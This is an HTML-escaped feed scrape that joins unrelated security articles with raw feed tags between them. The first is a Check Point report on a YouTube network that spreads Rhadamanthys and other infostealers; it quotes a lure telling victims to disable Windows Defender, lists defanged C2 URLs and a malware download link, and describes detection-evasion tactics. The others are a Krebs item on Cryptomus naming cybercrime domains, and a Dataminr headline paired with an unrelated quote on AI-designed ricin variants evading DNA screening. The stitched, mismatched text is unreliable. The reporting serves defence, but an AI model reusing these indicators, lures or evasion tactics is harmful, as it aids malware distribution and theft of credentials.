&lt;p&gt;The YouTube Ghost Network is a collection of malicious accounts operating on YouTube. These accounts take advantage of various platform features, such as videos, descriptions, posts (a lesser-known YouTube feature similar to Facebook post) and comments to promote malicious content and distribute malware, while creating a false sense of trust. The majority of the network consists of compromised YouTube accounts, which, once added, are assigned specific operational roles. This role-based structure enables stealthier distribution, as banned accounts can be rapidly replaced without disrupting the overall operation.&lt;/p&gt;



&lt;p&gt;The three primary roles are as follows:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Video-accounts&lt;/strong&gt;, upload “phishing” videos and provide descriptions containing links to download the purported software. To further enhance legitimacy, these accounts often respond to comments from “users” on the malicious videos. After uploading, they may update the description with fresh links.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Post-accounts&lt;/strong&gt;, are responsible for publishing community messages and posts. These accounts share the external download links and passwords for accessing password-protected archives. They frequently update these posts with new links and passwords. In some cases, &lt;strong&gt;video-accounts&lt;/strong&gt; may also directly share the external link and password. Possibly, this type of account uses AI to engage with comments under the videos.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Interact-accounts&lt;/strong&gt;, endorse malicious content by posting positive comments or liking videos and posts, thereby making it appear safe and trustworthy.&lt;/li&gt;
&lt;/ol&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-32033" height="613" src="https://research.checkpoint.com/wp-content/uploads/2025/10/Picture8-1024x613.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 1 — YouTube Ghost Network operation.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;In addition to the typical methods described above, we have observed several variations in the tactics employed by &lt;strong&gt;video-accounts&lt;/strong&gt;:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Sharing the external link directly in the description.&lt;/li&gt;



&lt;li&gt;Sharing the link as a pinned comment.&lt;/li&gt;



&lt;li&gt;Not sharing any links either in the description or in the comments, instead sharing the password and link during the video “installation” process.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;The external links provided typically redirect users to file-sharing services such as MediaFire, Dropbox, or Google Drive, or to phishing pages hosted on platforms like Google Sites, Blogspot, or Telegraph (&lt;code&gt;telegra.ph&lt;/code&gt;). These pages contain further links to download the malicious software. Frequently, shortened URLs are used to hide the true destination of the external link.&lt;/p&gt;


&lt;div class="wp-block-image is-style-default"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32036" height="421" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-modified.png" width="875" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 2 — Typical description, with 1337 archive password.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The description of such videos follows a typical “structure”, with a download link and password shared. Step-by-step instructions are often provided, commonly advising users to “temporarily” disable Windows Defender. In most cases, the malware distributed is an infostealer, designed to exfiltrate user information and credentials to a malicious command and control (C2) server.&lt;/p&gt;



&lt;p&gt;Check Point Research has been monitoring the YouTube Ghost Network for approximately a year and has identified multiple malware families, primarily infostealers, with &lt;strong&gt;Lumma&lt;/strong&gt; and &lt;strong&gt;Rhadamanthys&lt;/strong&gt; being among the most prevalent. From 2024 until the disruption of &lt;a href="https://www.europol.europa.eu/media-press/newsroom/news/europol-and-microsoft-disrupt-world%E2%80%99s-largest-infostealer-lumma"&gt;Lumma&lt;/a&gt; between March and May 2025, Lumma was the most frequently distributed malware. Following this disruption, threat actors shifted to distributing Rhadamanthys as the preferred infostealer.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://research.checkpoint.com/2025/rhadamanthys-0-9-x-walk-through-the-updates/"&gt;Rhadamanthys&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-malware/lumma-malware/"&gt;Lumma&lt;/a&gt; Stealer&lt;/li&gt;



&lt;li&gt;StealC&lt;/li&gt;



&lt;li&gt;&lt;a href="https://blog.checkpoint.com/security/memdive-ai-engine-prevents-malicious-payloads-from-evading-security-measures/"&gt;RedLine&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;0debug and other Phemedrone variants&lt;/li&gt;



&lt;li&gt;NodeJS based loaders and downloaders&lt;/li&gt;



&lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;br /&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Campaign I &amp;#8211; Rhadamanthys&lt;/h2&gt;



&lt;p&gt;The YouTube channel &lt;code&gt;@Sound_Writer&lt;/code&gt;, with &lt;strong&gt;9,690 subscribers&lt;/strong&gt;, has published several videos primarily focused on &lt;strong&gt;cryptocurrency software&lt;/strong&gt; and &lt;strong&gt;gaming&lt;/strong&gt;, accumulating approximately &lt;strong&gt;24,000 views&lt;/strong&gt; in total. Our analysis indicates that this account has been compromised for over a year, as evidenced by the appearance of malicious videos that differ significantly from the channel’s previous content.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-32037" height="665" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-1-modified-1024x665.png" style="width: 668px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 3 — Compromised account for more than a year.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;One video, which has garnered around &lt;strong&gt;10,000 views&lt;/strong&gt;, advertises cryptocurrency software and instructs viewers to follow a link provided in the description. This link redirects users to a phishing page hosted on &lt;code&gt;sites.google.com&lt;/code&gt;, created by the threat actor, which also shares the password for a password-protected archive containing the malicious payload.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-32038" height="640" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-2-modified-1024x640.png" style="width: 700px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 4 — 10,000 views on a video over a year old.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Although the shared archive is malicious, the software does not function as claimed, and the executable is not bundled with any legitimate application, the video has received 42 comments, the majority of which are overwhelmingly positive and encourage viewers to download and execute the program. These comments are likely posted by compromised or malicious accounts, further convincing victims to proceed with the installation.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-32039" height="860" src="https://research.checkpoint.com/wp-content/uploads/2025/10/comments-modified-1024x860.png" style="width: 733px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 5 — Positive Comments under the video.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The victims are redirected to the phishing site hosted on Google, where they are provided with installation instructions. A common step in these instructions is &lt;em&gt;&amp;#8220;Turning off Windows Defender&amp;#8221;,&lt;/em&gt; a step often instructed in the installation guide for potential victims. Eventually, the malware runs on an unprotected machine. Full Message:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Turn off Windows Defender temporarily
Don't worry — the archive is clean. Defender may trigger a false alert due to the way Setup.exe works with installations.
&lt;/pre&gt;



&lt;p&gt;&lt;br /&gt;&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-32040" height="866" src="https://research.checkpoint.com/wp-content/uploads/2025/10/Screenshot_2025-09-11_115018-modified.png" style="width: 584px; height: auto;" width="968" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 6 — Google Sites phishing page.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;During this campaign, the threat actor utilized two different platforms to host the same malicious file, providing redundancy and increasing stealth in case one instance was detected or reported. Another observed tactic is the upload of large files, which are often overlooked by automated scanning systems. Additionally, password-protected archives are used to evade inspection, as security solutions cannot decompress and analyze the contents without the password.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-32041" height="119" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-3-modified.png" style="width: 522px; height: auto;" width="458" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 7 — Large file no scan.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The archive contains multiple files designed to masquerade as legitimate software. Based on compilation and modification timestamps, the campaign likely began on 8 September.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32042" height="359" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-4-modified.png" width="986" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 8 — Archive content.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The delivered payload is the latest version of &lt;a href="https://research.checkpoint.com/2025/rhadamanthys-0-9-x-walk-through-the-updates/"&gt;Rhadamanthys infostealer&lt;/a&gt; (&lt;strong&gt;v0.9.2&lt;/strong&gt;), which was observed communicating with the command-and-control (C2) endpoint &lt;code&gt;hxxps://94.74.164[.]157:8888/gateway/6xomjoww.1hj7n&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;On &lt;strong&gt;23 September&lt;/strong&gt;, the threat actor replaced the original payload with a new version and updated the links on their &lt;code&gt;sites.google.com&lt;/code&gt; phishing page. This campaign continues to distribute fresh malware, leveraging YouTube as a primary distribution channel.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-32043" height="605" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-5-modified.png" style="width: 658px; height: auto;" width="796" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 9 — Newer campaign, file upload from Germany.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Subsequently, the actor switched to new Rhadamanthys v0.9.2 control servers: &lt;code&gt;openai-pidor-with-ai[.]com:6343&lt;/code&gt; and &lt;code&gt;178[.]16.53.236:6343&lt;/code&gt;, using the path &lt;code&gt;/gateway/pqnrojhl.adc7k&lt;/code&gt;. The actor’s low-effort updates enable continuous distribution of the Rhadamanthys infostealer, significantly increasing the campaign’s persistence and reach.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Campaign II &amp;#8211; HijackLoader &amp;amp; Rhadamanthys&lt;/h2&gt;



&lt;p&gt;The YouTube account &lt;code&gt;@Afonesio1&lt;/code&gt;, with approximately &lt;strong&gt;129,000 subscribers&lt;/strong&gt;, was compromised between &lt;strong&gt;December 3, 2024, and January 5, 2025&lt;/strong&gt;. Since the compromise, the account has uploaded four videos to distribute malware.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-32045" height="699" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-6-modified-1024x699.png" style="width: 712px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 10 — Video with 291,000 views and 54 comments distributing malware.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;One of the most viewed videos, with &lt;strong&gt;291,155 views&lt;/strong&gt; and &lt;strong&gt;54 positive comments&lt;/strong&gt;, was used to lure unsuspecting viewers into downloading and executing a cracked version of Adobe Photoshop.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-32049" height="559" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image4-modified.png" style="width: 768px; height: auto;" width="889" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 11 — Positive comments suggesting cracked software works.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Within the video’s description, a community message link and the password required to decompress the password-protected archive are provided. The community post also includes the download link and archive password. This post received approximately &lt;strong&gt;1,200 likes&lt;/strong&gt; and numerous positive comments praising the effectiveness of the software solution. The short link shared in the post redirects users to Dropbox, where the file can be downloaded: &lt;code&gt;hxxps://www.dropbox[.]com/scl/fi/9cwpoorh4xmxxpyssxdwi/Adobe.Premiere.Pro.2025.rar?rlkey=d1p8taclagn2brrdrg0qlic47&amp;amp;st=23bxjuyi&amp;amp;dl=1&lt;/code&gt;&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-32051" height="689" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-7-modified-1.png" style="width: 706px; height: auto;" width="864" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 12 — Account post with shared link, archive password and comments.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The specific account and post are responsible for distributing the latest link, which delivers a password-protected archive. This account has previously published multiple posts promoting various software products, including Adobe Photoshop, Adobe Premiere Pro, Lightroom, Filmora, FL Studio, and CorelDRAW. Notably, these applications appeal to a targeted audience of YouTubers and other content creators, suggesting that the threat actor may be deliberately tailoring their campaign toward this demographic.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32052" height="802" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-8-modified.png" width="881" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 13 — Multiple account posts for each “software solution”.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The downloaded archive contains an &lt;strong&gt;MSI file&lt;/strong&gt; with both compilation and modification timestamps of &lt;strong&gt;21 September&lt;/strong&gt;, indicating the likely start date of the campaign. The same file was first observed on VirusTotal on that date, exhibiting a low detection rate.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-32053" height="148" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-9-modified-1024x148.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 14 — Malicious MSI with low detection rate.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Notably, the archive also contains a file named &lt;code&gt;Adobe.Photoshop.2024.v25.1.0.120.exe&lt;/code&gt;, which is in fact a cracked version of Adobe Photoshop. It remains unclear whether the positive comments originate from real users who inadvertently infected themselves or from ghost accounts promoting the malicious software with AI comments.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-32054" height="258" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-10-modified.png" style="width: 637px; height: auto;" width="545" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 15 — Cracked Photoshop.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The &lt;strong&gt;MSI&lt;/strong&gt; installer within the archive contains multiple files. Analysis of the &lt;strong&gt;CustomAction&lt;/strong&gt; table using &lt;a href="https://github.com/activescott/lessmsi"&gt;lessmsi&lt;/a&gt; reveals that the executable &lt;code&gt;bw97v41m.exe&lt;/code&gt; is launched first, before being written to disk as &lt;code&gt;Remote-Vector32.exe&lt;/code&gt;. The payload identified is &lt;strong&gt;HijackLoader&lt;/strong&gt;, which subsequently delivers the &lt;strong&gt;Rhadamanthys infostealer&lt;/strong&gt;. In this campaign, Rhadamanthys was observed communicating with the command-and-control (C2) server at &lt;code&gt;hxxps://5.252.155[.]99/gateway/r2sh55wm.a56d3&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;On &lt;strong&gt;24 September&lt;/strong&gt;, the attacker updated the archive and added new download links. The updated Rhadamanthys malware communicates with &lt;code&gt;hxxps://5.252[.]155.231/gateway/3jw9q65j.b3tit&lt;/code&gt;. The VirusTotal detection score for this sample was even lower than previous submissions, indicating a high likelihood that the attack could evade detection by most antivirus solutions.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-32055" height="143" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-11-modified-1024x143.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 16 — Updated MSI file.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The attacker appears to release a new version of the malware every three to four days, rotating control servers (C2s) with each update. These short-lived builds and frequent C2 changes undermine reputation-based detection mechanisms. Each new sample and C2 endpoint appears new to security systems, preventing the accumulation of reputation data and making it more difficult to block the campaign.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-32056" height="383" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-12-modified-1024x383.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 17 — Campaign update after three days.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;&lt;br /&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Network Statistics&lt;/h2&gt;



&lt;p&gt;Targeting users through Ghost Networks is analogous to casting nets across the web, users must approach and essentially infect themselves. To attract these users, threat actors offer a variety of tailored solutions designed to appeal to specific audiences. By analyzing more than &lt;strong&gt;3,000&lt;/strong&gt; video titles, we identified and categorized the user groups that were most frequently targeted and most actively engaged.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32057" height="392" src="https://research.checkpoint.com/wp-content/uploads/2025/10/Screenshot_2025-09-26_150437-modified.png" width="726" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 18 — Targeted audience categories.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The most targeted game from the “Game Hacks/ Cheats” is &lt;a href="https://www.statista.com/statistics/1192573/daily-active-users-global-roblox/"&gt;Roblox&lt;/a&gt;, &lt;em&gt;with &lt;strong&gt;380 million monthly&lt;/strong&gt; active users and about &lt;strong&gt;111.8 million daily&lt;/strong&gt; active users.&lt;/em&gt; In the “Software Cracks/Piracy” category, &lt;strong&gt;Adobe&lt;/strong&gt; products are the primary targets, with &lt;strong&gt;Photoshop&lt;/strong&gt; and &lt;strong&gt;Lightroom&lt;/strong&gt; leading the list. The most viewed malicious video in our dataset targets &lt;strong&gt;Adobe Photoshop&lt;/strong&gt;, amassing &lt;strong&gt;293,000 views&lt;/strong&gt; and &lt;strong&gt;54 comments&lt;/strong&gt;, while the second most viewed targets FL Studio, with &lt;strong&gt;147,000 views&lt;/strong&gt;. Although the game category contains a greater number of videos, the total view counts are significantly lower compared to those in the software category.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;The ongoing evolution of malware distribution methods demonstrates the remarkable adaptability and resourcefulness of threat actors in bypassing conventional security defenses. While email phishing remains a well-known and persistent threat, our research reveals that adversaries are increasingly shifting toward more sophisticated, platform-based strategies, most notably, the deployment of &lt;strong&gt;Ghost Networks&lt;/strong&gt;. These networks leverage the trust inherent in legitimate accounts and the engagement mechanisms of popular platforms to orchestrate large-scale, persistent, and highly effective malware campaigns.&lt;/p&gt;



&lt;p&gt;The YouTube Ghost Network, as uncovered in our investigation, exemplifies this new paradigm. By systematically compromising accounts and assigning them specialized roles, such as content creation, community engagement, and trust-building, threat actors are able to maintain operational continuity even in the face of account bans or takedowns. This modular, role-based structure not only increases the resilience of the network but also enables rapid adaptation to platform countermeasures, making detection and disruption significantly more challenging for defenders.&lt;/p&gt;



&lt;p&gt;Our analysis of over 3,000 malicious videos revealed a clear targeting strategy, content is tailored to appeal to high-engagement user groups, such as gamers seeking cheats and individuals searching for cracked or pirated software. The use of positive comments, likes, and community posts further amplifies the perceived legitimacy of these campaigns, increasing the likelihood of user interaction and self-infection. The sharp rise in malicious video uploads in 2025, tripling previous years’ volumes, underscores the scalability and growing effectiveness of this distribution model.&lt;/p&gt;



&lt;p&gt;The technical sophistication of these campaigns is further evidenced by the use of password-protected archives, redundant hosting platforms, and frequent updates to both payloads and command-and-control (C2) infrastructure. These tactics are specifically designed to evade automated detection, reputation-based blocking, and manual review by both platform operators and security vendors.&lt;/p&gt;



&lt;p&gt;The implications for the cybersecurity community are significant. As threat actors continue to innovate, &lt;strong&gt;collaboration between security researchers, platform providers, and law enforcement becomes increasingly critical&lt;/strong&gt;. Proactive threat intelligence sharing, rapid takedown of malicious content, and continuous improvement of detection technologies are essential to counteract these evolving threats. Additionally, user education remains a vital line of defense, individuals must be made aware of the risks associated with downloading software from unofficial sources and the deceptive tactics employed by cybercriminals.&lt;/p&gt;



&lt;p&gt;Check Point Research’s comprehensive investigation into the YouTube Ghost Network has not only exposed the operational playbook of these actors but has also led to tangible disruption. By reporting over &lt;strong&gt;3,000&lt;/strong&gt; malicious videos to Google, we have directly contributed to the dismantling of this network and the protection of countless users worldwide. However, the persistence and adaptability of these campaigns highlight the need for ongoing vigilance, innovation, and cross-sector cooperation to safeguard the digital ecosystem against the next generation of malware distribution strategies.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt="" class="aligncenter wp-image-69762" height="156" src="https://krebsonsecurity.com/wp-content/uploads/2024/12/cryptomusblack.png" width="745" /&gt;&lt;/p&gt;
&lt;p&gt;On October 16, the &lt;strong&gt;Financial Transactions and Reports Analysis Center of Canada&lt;/strong&gt; (FINTRAC) imposed a $176,960,190 penalty on &lt;strong&gt;Xeltox Enterprises Ltd.&lt;/strong&gt;, more commonly known as the cryptocurrency payments platform &lt;strong&gt;Cryptomus&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;FINTRAC &lt;a href="https://fintrac-canafe.canada.ca/new-neuf/nr/2025-10-22-eng" rel="noopener" target="_blank"&gt;found&lt;/a&gt; that Cryptomus failed to submit suspicious transaction reports in cases where there were reasonable grounds to suspect that they were related to the laundering of proceeds connected to trafficking in child sexual abuse material, fraud, ransomware payments and sanctions evasion.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Given that numerous violations in this case were connected to trafficking in child sexual abuse material, fraud, ransomware payments and sanctions evasion, FINTRAC was compelled to take this unprecedented enforcement action,&amp;#8221; said &lt;strong&gt;Sarah Paquet&lt;/strong&gt;, director and CEO at the regulatory agency.&lt;/p&gt;
&lt;p&gt;In December 2024, KrebsOnSecurity covered research by blockchain analyst and investigator &lt;strong&gt;Richard Sanders&lt;/strong&gt;, who&amp;#8217;d spent several months signing up for various cybercrime services, and then tracking where their customer funds go from there. The &lt;a href="https://krebsonsecurity.com/2024/12/how-cryptocurrency-turns-to-cash-in-russian-banks/" rel="noopener" target="_blank"&gt;122 services targeted in Sanders&amp;#8217;s research&lt;/a&gt; all used Cryptomus, and included some of the more prominent businesses advertising on the cybercrime forums, such as:&lt;/p&gt;
&lt;p&gt;-abuse-friendly or “bulletproof” hosting providers like anonvm[.]wtf, and &lt;a href="https://krebsonsecurity.com/tag/pq-hosting/" rel="noopener" target="_blank"&gt;PQHosting&lt;/a&gt;;&lt;br /&gt;
-sites selling aged email, financial, or social media accounts, such as verif[.]work and kopeechka[.]store;&lt;br /&gt;
-anonymity or “proxy” providers like crazyrdp[.]com and rdp[.]monster;&lt;br /&gt;
-anonymous SMS services, including anonsim[.]net and smsboss[.]pro.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_69745" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-69745" height="429" src="https://krebsonsecurity.com/wp-content/uploads/2024/12/flymoney.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-69745"&gt;Flymoney, one of dozens of cryptocurrency exchanges apparently nested at Cryptomus. The image from this website has been machine translated from Russian.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Sanders found at least 56 cryptocurrency exchanges were using Cryptomus to process transactions, including financial entities with names like casher[.]su, grumbot[.]com, flymoney[.]biz, obama[.]ru and swop[.]is.&lt;/p&gt;
&lt;p&gt;&amp;#8220;These platforms were built for Russian speakers, and they each advertised the ability to anonymously swap one form of cryptocurrency for another,&amp;#8221; the December 2024 story noted. &amp;#8220;They also allowed the exchange of cryptocurrency for cash in accounts at some of Russia’s largest banks — nearly all of which are currently sanctioned by the United States and other western nations.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Reached for comment on FINTRAC&amp;#8217;s action, Sanders told KrebsOnSecurity he was surprised it took them so long.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I have no idea why they don&amp;#8217;t just sanction them or prosecute them,&amp;#8221; Sanders said. &amp;#8220;I&amp;#8217;m not let down with the fine amount but it&amp;#8217;s also just going to be the cost of doing business to them.&amp;#8221;&lt;span id="more-72407"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;The $173 million fine is a significant sum for FINTRAC, which imposed 23 such penalties last year totaling less than $26 million. But Sanders says FINTRAC still has much work to do in pursuing other shadowy money service businesses (MSBs) that are registered in Canada but are likely money laundering fronts for entities based in Russia and Iran.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter wp-image-69766" height="458" src="https://krebsonsecurity.com/wp-content/uploads/2024/12/happycanada.png" width="750" /&gt;&lt;/p&gt;
&lt;p&gt;In an investigation published in July 2024, &lt;strong&gt;CTV National News &lt;/strong&gt;and the &lt;strong&gt;Investigative Journalism Foundation (IJF)&lt;/strong&gt; &lt;a href="https://theijf.org/msb-cluster-investigation" rel="noopener" target="_blank"&gt;documented dozens of cases&lt;/a&gt; across Canada where multiple MSBs are incorporated at the same address, often without the knowledge or consent of the location’s actual occupant.&lt;/p&gt;
&lt;p&gt;Their inquiry found that the street address for Cryptomus parent Xeltox Enterprises was listed as the home of at least 76 foreign currency dealers, eight MSBs, and six cryptocurrency exchanges. At that address is a three-story building that used to be a bank and now houses a massage therapy clinic and a co-working space. But the news outlets found none of the MSBs or currency dealers were paying for services at that co-working space.&lt;/p&gt;
&lt;p&gt;The reporters also found another collection of 97 MSBs clustered at an address for a commercial office suite in Ontario, even though there was no evidence any of these companies had ever arranged for any business services at that address.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=72407</guid><category>A Little Sunshine</category><category>Ne'er-Do-Well News</category><category>Ransomware</category><category>Russia's War on Ukraine</category><category>Web Fraud 2.0</category><category>Cryptomus</category><category>CTV National News</category><category>Financial Transactions and Reports Analysis Center of Canada</category><category>FINTRAC</category><category>Investigative Journalism Foundation</category><category>Richard Sanders</category><category>Sarah Paquet</category><category>Xeltox Enterprises Ltd</category></item><item><title>Dataminr to Acquire Cybersecurity Firm ThreatConnect in $290M Deal</title><link>https://www.techrepublic.com/article/news-dataminr-buys-threatconnect/</link><description>&lt;p&gt;The acquisition aims to merge Dataminr’s AI-driven real-time event detection with ThreatConnect’s internal threat management capabilities.&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;The team started with a basic test: use AI tools to design variants of the toxin ricin, then test them against the software that is used to screen DNA orders. The results of the test suggested there was a risk of dangerous protein variants slipping past existing screening software, so the situation was treated like the equivalent of a zero-day vulnerability.&lt;/p&gt;
&lt;p&gt;[&amp;#8230;]&lt;/p&gt;
&lt;p&gt;Details of that original test are ...&lt;/p&gt;&lt;/blockquote&gt;</description><content:encoded>&lt;p&gt;Interesting &lt;a href="https://arstechnica.com/science/2025/10/do-ai-designed-proteins-create-a-biosecurity-vulnerability/"&gt;article&lt;/a&gt; about the arms race between AI systems that invent/design new biological pathogens, and AI systems that detect them before they&amp;#8217;re created:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;The team started with a basic test: use AI tools to design variants of the toxin ricin, then test them against the software that is used to screen DNA orders. The results of the test suggested there was a risk of dangerous protein variants slipping past existing screening software, so the situation was treated like the equivalent of a zero-day vulnerability.&lt;/p&gt;
&lt;p&gt;[&amp;#8230;]&lt;/p&gt;
&lt;p&gt;Details of that original test are &lt;a href="https://www.science.org/doi/10.1126/science.adu8578"&gt;being made available today&lt;/a&gt; as part of a much larger analysis that extends the approach to a large range of toxic proteins. Starting with 72 toxins, the researchers used three open source AI packages to generate a total of about 75,000 potential protein variants.&lt;/p&gt;
&lt;p&gt;And this is where things get a little complicated. Many of the AI-designed protein variants are going to end up being non-functional, either subtly or catastrophically failing to fold up into the correct configuration to create an active toxin.&lt;/p&gt;
&lt;p&gt;[&amp;#8230;]&lt;/p&gt;
